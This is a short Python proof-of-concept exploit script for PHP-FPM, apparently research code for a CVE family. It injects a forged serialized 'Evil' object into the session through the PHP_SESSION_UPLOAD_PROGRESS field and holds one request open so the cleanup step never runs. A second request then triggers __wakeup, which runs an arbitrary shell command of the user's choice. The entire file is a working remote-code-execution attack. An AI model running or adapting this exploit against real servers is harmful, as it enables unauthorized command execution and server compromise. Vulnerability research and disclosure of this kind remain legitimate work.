#!/usr/bin/env python3
"""Progress-key injection + pre-RINIT Evil::__wakeup on FPM (CVE-2026-109619 family).

Write: stalled multipart to /index.php. The default `php` serializer writes the
session key verbatim, so a PHP_SESSION_UPLOAD_PROGRESS value containing
`x|O:4:"Evil":...` puts a forged object into the session file. The stock
cleanup=On END is bypassed by holding the request open at FILE_START; this
needs two workers.
Read: a second upload-progress request with the same session id. Its pre-RINIT
session decode unserializes Evil and fires __wakeup before RINIT.

Usage: chain_e.py <port> [cmd]
"""
import os
import socket
import sys
import time

port = int(sys.argv[1]) if len(sys.argv) > 1 else 9001
cmd = sys.argv[2] if len(sys.argv) > 2 else "id > /tmp/preproof3"
sid = "chaine" + "".join("%02x" % b for b in os.urandom(10))

payload = f'x|O:4:"Evil":1:{{s:3:"cmd";s:{len(cmd)}:"{cmd}";}}'
boundary = b"----chainE"

prefix = (
    b"--" + boundary + b"\r\n"
    b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
    + payload.encode() + b"\r\n"
    b"--" + boundary + b"\r\n"
    b'Content-Disposition: form-data; name="f"; filename="t"\r\n'
    b"Content-Type: application/octet-stream\r\n\r\n"
    b"Z" * 64
)
total = len(prefix) + 200000

w = socket.create_connection(("127.0.0.1", port), timeout=10)
w.sendall(
    b"POST /index.php HTTP/1.1\r\nHost: 127.0.0.1\r\n"
    b"Cookie: PHPSESSID=" + sid.encode() + b"\r\n"
    b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n"
    b"Content-Length: " + str(total).encode() + b"\r\n"
    b"Connection: close\r\n\r\n" + prefix
)
time.sleep(0.8)

body = (
    b"--" + boundary + b"\r\n"
    b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
    b"--" + boundary + b"\r\n"
    b'Content-Disposition: form-data; name="g"; filename="u"\r\n\r\nZ\r\n'
    b"--" + boundary + b"--\r\n"
)
r = socket.create_connection(("127.0.0.1", port), timeout=10)
r.sendall(
    b"POST /index.php HTTP/1.1\r\nHost: 127.0.0.1\r\n"
    b"Cookie: PHPSESSID=" + sid.encode() + b"\r\n"
    b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n"
    b"Content-Length: " + str(len(body)).encode() + b"\r\n"
    b"Connection: close\r\n\r\n" + body
)
resp = b""
try:
    while True:
        c = r.recv(65536)
        if not c:
            break
        resp += c
except socket.timeout:
    pass
r.close()
w.close()
head, _, out = resp.partition(b"\r\n\r\n")
print(head.split(b"\r\n", 1)[0].decode("latin-1"))
print(out.decode("latin-1", "replace"))
